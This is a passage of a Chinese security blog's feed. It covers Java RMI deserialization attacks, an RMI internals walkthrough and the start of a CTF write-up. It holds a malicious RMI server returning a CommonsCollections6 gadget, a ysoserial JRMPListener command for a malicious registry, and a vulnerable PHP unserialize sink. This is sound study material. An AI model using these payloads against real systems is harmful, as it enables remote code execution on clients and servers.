title="Server攻击Client"></a>Server攻击Client</h1><p>Server返回给Client远程方法调用结果的时候，会序列化传输</p><p>服务端收到会反序列化触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.RMIServer;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadServer1</span> &#123;</span><br><span class="line">    <span class="comment">//Server攻击Client</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCalc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RCalc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">map</span> <span class="operator">=</span> CC6.getCC6();</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RCalc</span> <span class="variable">rCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RCalc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,rCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BadServer1</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Registry攻击Client"><a href="#Registry攻击Client" class="headerlink" title="Registry攻击Client"></a>Registry攻击Client</h1><p>可以用ysoserial搭建恶意Registry来打Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">3333</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习RMI反序列化攻击相关1</summary>
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="rmi" scheme="https://xianbeil.github.io/tags/rmi/"/>
    
  </entry>
  
  <entry>
    <title>rmi代码分析</title>
    <link href="https://xianbeil.github.io/2022/05/02/rmi%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://xianbeil.github.io/2022/05/02/rmi%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2022-05-01T17:50:20.000Z</published>
    <updated>2022-05-01T17:52:35.810Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介前的简介"><a href="#简介前的简介" class="headerlink" title="简介前的简介"></a>简介前的简介</h1><p>额，一直以来貌似养成了不好的习惯，在写完这一篇之后发现，我为什么要写文章啊。。</p><p>博客是放笔记的，对吧，写的自己看懂就行了。还指望给别人看呢。</p><p>所以这是本博客最后一篇可能有可能别人能看懂的文章。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430094406-ku9mt1b.png" alt="image.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在处理rmi的时候发现当时学的比较早导致一些东西没有分析的很清楚，今天把他其中的一些过程重新分析一下，rmi还是很重要的一部分。</p><p>对rmi其中的各种流程的代码部分进行简单的调试和分析。</p><p>简单写一个rmi本地调用的project即可开始调试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello&quot;</span>+name);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        RMIHello rmiHello=<span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,rmiHello);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><h2 id="服务端创建远程对象"><a href="#服务端创建远程对象" class="headerlink" title="服务端创建远程对象"></a>服务端创建远程对象</h2><p>rmi中的远程对象都继承了<code>UnicastRemoteObject</code>类，然后实现远程接口，<code>IHello</code>接口也继承了<code>Remote</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span>&#123;</span><br></pre></td></tr></table></figure><p>所以我们要看的就是他的构造方法</p><hr><h3 id="UnicastRemoteObject-exportObject"><a href="#UnicastRemoteObject-exportObject" class="headerlink" title="UnicastRemoteObject.exportObject"></a>UnicastRemoteObject.exportObject</h3><p>会先进入父类<code>UnicastRemoteObject</code>的构造方法，在<code>UnicastRemoteObject</code>构造方法中会进入<code>java.rmi.server.UnicastRemoteObject#exportObject(java.rmi.Remote, int)</code>方法</p><p>其中传入的默认的port为0</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115251-c5b84n3.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115509-aev0l0d.png" alt="image.png"></p><p>所以首先会创建一个<code>UnicastServerRef</code>对象，</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115710-j5yzzyy.png" alt="image.png"></p><p>在创建这个对象的时候，首先又会封装一个<code>LiveRef</code>对象进去</p><h4 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h4><p>下面多次封装同一个LiveRef对象，就是为了客户端和服务端的通信</p><p><code>sun.rmi.transport.LiveRef</code>对象会封装进三个属性，其中包含了本地ip，它实际上是负责网络通信的一个对象</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115835-oq6cuos.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115939-1c3x3vb.png" alt="image.png"></p><h4 id="UnicastServerRef"><a href="#UnicastServerRef" class="headerlink" title="UnicastServerRef"></a>UnicastServerRef</h4><p>UnicastServerRef类继承自UnicastRef类，其实也就是简单的把liveRef对象封装进去。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501232936-sihubqs.png" alt="image.png"></p><p>当我们封装好了<code>UnicastServerRef</code>对象的时候，再进入<code>java.rmi.server.UnicastRemoteObject#exportObject</code>方法中</p><p>封装好的<code>UnicastServerRef</code>对象：</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501233118-qdzrbvb.png" alt="image.png"></p><p>其实又是一个封装的过程，把<code>UnicastServerRef</code>对象封装到一开始的<em>远程对象</em>中，也就是<code>RMIHello</code>这个远程对象</p><p>此时我们的远程对象已经创建好了</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501233256-skki01h.png" alt="image.png"></p><h4 id="UnicastServerRef-exportObject"><a href="#UnicastServerRef-exportObject" class="headerlink" title="UnicastServerRef.exportObject"></a>UnicastServerRef.exportObject</h4><p>接着会进入<code>sun.rmi.server.UnicastServerRef#exportObject(java.rmi.Remote, java.lang.Object, boolean)</code>方法中</p><p>先用创建动态代理的方式创建了一个存根stub，他就是RMIHello的动态代理类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430221912-74xoh8s.png" alt="image.png"></p><h5 id="Util-createProxy"><a href="#Util-createProxy" class="headerlink" title="Util.createProxy"></a>Util.createProxy</h5><p>稍微跟进一下<code>sun.rmi.server.Util#createProxy</code>方法，他是一个创建动态代理的方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501233821-g4uvmgu.png" alt="image.png"></p><p>getRemoteClass方法会对传入的远程对象进行一下验证然后返回它的class</p><p>接着就是创建动态代理，classloader,handler</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235123-nrespux.png" alt="image.png"></p><p>创建动态代理</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235230-gcj2jfi.png" alt="image.png"></p><p>可以看到返回的Proxy0动态代理对象，里面也封装了LiveRef这个对象</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235538-uyrd9be.png" alt="image.png"></p><hr><p>接着新建一个Target对象，把刚刚的一系列东西都封装进去</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235855-e4tx6on.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000100-2r10ra9.png" alt="image.png"></p><hr><p>接下来进到<code>sun.rmi.transport.LiveRef#exportObject</code>方法中，也就是哪里都封装了的LiveRef对象</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501154724-2c6h00x.png" alt="image.png"></p><p>这个方法进到<code>sun.rmi.transport.tcp.TCPTransport#exportObject</code>方法，实际上他就是开一个端口，然后把Target对象放上去</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501154757-z6sxyy5.png" alt="image.png"></p><p>接着下面还会exportObject一次target，是进到<code>sun.rmi.transport.Transport#exportObject</code>方法中</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000458-yjwv6vo.png" alt="image.png"></p><p>根据注释理解一下，这个方法就是把远程对象放在服务端，等待客户端来的请求</p><p>下面的<code>sun.rmi.transport.ObjectTable#putTarget</code>也就是一个表put的操作，把target装入</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000701-3zyzueu.png" alt="image.png"></p><hr><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000834-bipeju0.png" alt="image.png"></p><p>最后返回的是这个对象，至此远程对象创建完毕</p><h2 id="注册中心创建逻辑"><a href="#注册中心创建逻辑" class="headerlink" title="注册中心创建逻辑"></a>注册中心创建逻辑</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501155207-0ldmwfw.png" alt="image.png"></p><p>其实就是新建一个RegistryImpl对象，传入的参数值是默认的1099端口</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160056-0ww1bzu.png" alt="image.png"></p><p>首先会创建一个LiveRef作用于通讯</p><p>又创建一个UnicastServerRef类，在服务端创建的时候我们已经遇到过了一次这个构造方法，再一次进入</p><p>可以看到也就只是封装了一个ref对象用于网络通讯</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160253-ih82ny6.png" alt="image.png"></p><p>接着进入setup方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160343-xnzpcbm.png" alt="image.png"></p><p>在其中我们又看到了熟悉的<code>sun.rmi.server.UnicastServerRef#exportObject(java.rmi.Remote, java.lang.Object, boolean)</code>方法，在上面创建服务端对象的时候也遇到过</p><p>不过这里参数有所不同</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160423-3kbzmw2.png" alt="image.png"></p><p>这里创建的代理是这个注册中心的代理类，也就是RegistryImpl类</p><p>他还会进入setSeleton方法中</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160554-dh8g271.png" alt="image.png"></p><blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160652-5o58gzz.png" alt="image.png"></p><p>可以看到createSelection方法接受一个Remote对象</p><p>然后加载它后缀加上Skel的class对象来获取Skeleton</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160903-459f9if.png" alt="image.png"></p></blockquote><p>这个方法过后，skeleton类被加载到这个UnicastServerRef中</p><p>skeleton和stub就是分别对应服务端和客户端的网络代理</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501161058-si3jzgl.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501162044-z7izfgz.png" alt="image.png"></p><p>注册中心同时提供了skl和stub，因为要和服务端和客户端两端通讯</p><p>因此最终<code>createRegistry()</code>的结果就是返回了一个<code>RegistryImpl</code>对象，并且赋值<code>this.skel=RegistryImpl_Skel</code>。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502010214-ppg0qgx.png" alt="image.png"></p><h2 id="注册中心绑定逻辑"><a href="#注册中心绑定逻辑" class="headerlink" title="注册中心绑定逻辑"></a>注册中心绑定逻辑</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501162342-he8el2h.png" alt="image.png"></p><p>先获取到注册中心</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501162405-yfa99q0.png" alt="image.png"></p><p>然后调用<code>sun.rmi.registry.RegistryImpl_Stub#bind</code>把UnicastServerRef对象绑定上去</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501183232-uz4rh5e.png" alt="image.png"></p><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>同样的先获取到注册中心</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501194145-mayrxs7.png" alt="image.png"></p><p>返回的是注册中心的stub对象</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501194221-vfdvky0.png" alt="image.png"></p><p>然后进到<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code>方法中，也就是我们根据注册的名称来查找类</p><p>先会对我们查找的这个远程类名称字符串序列化进去</p><p>newCall方法就是一个网络请求的操作，这也和之前我们分析的流量对应了起来</p><p>说明注册中心也会有一个反序列化的操作</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501194919-s6b9di5.png" alt="image.png"></p><p>然后在下面的invoke方法中实现网络请求</p><p>也就是这个executeCall方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501195240-oqvfrmb.png" alt="image.png"></p><p>然后就通过反序列化得到返回来的远程对象代理</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501195429-rkco705.png" alt="image.png"></p><p>这里有2个反序列化点，都是反序列化注册中心返回来的代理对象，如果我们创建一个恶意注册中心返回恶意stub就可能实现对客户端的反序列化攻击，分别是这两个地方（上面提了一个地方）</p><h2 id="UnicastRef-invoke"><a href="#UnicastRef-invoke" class="headerlink" title="UnicastRef.invoke"></a>UnicastRef.invoke</h2><p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code></p><p>第一个地方就是在invoke方法中的<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>方法中</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501195911-qumij3j.png" alt="image.png"></p><p>在处理异常的地方里面有一个反序列化的操作</p><p>如果是这个异常的话，就会触发反序列化</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501200834-nyhcu1a.png" alt="image.png"></p><p>并且这个<code>sun.rmi.server.UnicastRef#invoke</code>方法在很多地方都会被调用</p><h2 id="RegistryImpl-Stub-lookup"><a href="#RegistryImpl-Stub-lookup" class="headerlink" title="RegistryImpl_Stub.lookup"></a>RegistryImpl_Stub.lookup</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501201220-dnkf9y3.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501201542-ngvl28l.png" alt="image.png"></p><p>最后就会获得之前我们创建的服务端对象的远程代理，可以看到里面封装的LiveRef对象</p><h1 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h1><p>因为我们获取hello对象是远程对象的动态代理，所以对他调用任意方法的时候就会进入handler（调用处理器）的invoke方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501201937-eief2vw.png" alt="image.png"></p><p>首先会对这个方法是否属于该远程对象进行一个判断</p><p>然后这里又会调用<code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code>这个方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202434-haixi7n.png" alt="image.png"></p><p>接着<code>sun.rmi.server.UnicastRef#marshalValue</code>方法中会把参数值序列化进去</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202704-t2kqyd0.png" alt="image.png"></p><p>接下来又会调用到executeCall方法，所有的客户端的请求都会用到这个方法</p><blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501203015-frla00p.png" alt="image.png"></p><p>这里建立的连接就是和服务端直接建立连接了</p></blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202615-nkk2aoo.png" alt="image.png"></p><p>接着就是获取方法调用结果</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202903-yeujj15.png" alt="image.png"></p><p>和上面的marshaValue对应，unmarshalValue方法中对返回的数据进行了反序列化处理</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202930-tierni1.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502010732-6uc4aqf.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>引用自<a href="https://zhishihezi.net/endpoint/richtext/6afc74481673af6429d96f73c340f7bc?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00571152a420cac6258bd33ad949557d182c6ff5f5474f62c9815a8cca721c910502a64422f5bb96989f53cef2ae22d07a1ce71282863f5769d1661fd52e3b1970c1dba0b488dc02b9a345ec36cad6c7cd53afd7f10083e357f268fd3248ccfd7d5b11e47226e96d2f2a3033ee546b961d6cd75285ec2ae0f06ba0573b5d9fb4f11819d3dfd64d4cff04450762cdecfd051e990a1419cb198b787b39ec8f4d81c26ab3b7c18b2aa0744c225e3c03a3e5de2350bd5108c5814e14edcc23414a7153#0">Javasec</a></p><p>RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p><ol><li>RMI 客户端在调用远程方法时会先创建 Stub ( <code>sun.rmi.registry.RegistryImpl_Stub</code> )。</li><li>Stub 会将 Remote 对象传递给远程引用层 ( <code>java.rmi.server.RemoteRef</code> ) 并创建 <code>java.rmi.server.RemoteCall</code>( 远程调用 )对象。</li><li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li><li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li><li>RMI服务端的远程引用层( <code>sun.rmi.server.UnicastServerRef</code> )收到请求会请求传递给 Skeleton ( <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code> )。</li><li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li><li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li><li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li><li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li><li>RMI 客户端反序列化 RMI 远程方法调用结果。</li></ol>]]></content>
    
    
    <summary type="html">在处理rmi的时候发现当时学的比较早导致一些东西没有分析的很清楚，今天把他其中的一些过程重新分析一下，rmi还是很重要的一部分。</summary>
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="rmi" scheme="https://xianbeil.github.io/tags/rmi/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub2022春季赛</title>
    <link href="https://xianbeil.github.io/2022/04/27/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <id>https://xianbeil.github.io/2022/04/27/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B/</id>
    <published>2022-04-27T15:54:27.000Z</published>
    <updated>2022-06-02T00:37:08.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnhub春季赛web"><a href="#pwnhub春季赛web" class="headerlink" title="pwnhub春季赛web"></a>pwnhub春季赛web</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>周末一堆事情，而且周日正常上课，搞得没有好好打。所以认真复现一下。</p><h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><blockquote><ol><li>mysql恶意服务端读取文件</li><li>路径拼接导致的文件包含</li></ol></blockquote><p>mysql恶意服务端读取任意文件</p><p>然后路径大概是这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/www/html/route/route.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/baseTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/mysqlTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/base64Tool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/testTool.php</span><br></pre></td></tr></table></figure><p>读取到testTool的时候就发现了hint</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testTool</span> <span class="keyword">extends</span> <span class="title">baseTool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>] = <span class="variable">$arg</span>[<span class="string">&#x27;Y0U_CA0_n3vEr_F1nD_m3_LOL&#x27;</span>] <span class="keyword">or</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">userToolInit</span>(<span class="keyword">__CLASS__</span>, <span class="string">&#x27;./index.php?s=tool/test&#x27;</span>, <span class="string">&#x27;testxe7xb1xbb&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/sandbox&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="variable">$value</span>();</span><br><span class="line">        